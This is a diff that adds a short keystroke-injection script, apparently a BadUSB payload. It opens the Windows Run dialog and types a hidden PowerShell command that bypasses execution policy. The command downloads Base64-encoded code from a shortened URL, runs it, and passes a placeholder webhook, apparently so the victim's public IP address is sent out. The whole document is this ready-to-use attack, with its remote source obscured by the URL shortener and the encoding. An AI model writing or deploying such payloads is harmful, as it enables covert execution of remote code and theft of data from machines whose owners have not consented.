@@ -1,0 +1,8 @@
+REM The script must interface with a Base64-encoded LINK for proper functionality.
+REM shorturl.at is used to condense this url: https://raw.githubusercontent.com/calinux-py/PowerShell/refs/heads/main/Get-PublicIP/get-publicip.ps1
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm shorturl.at/Bp19Z))))) $w="webhook here"
+DELAY 500
+ENTER
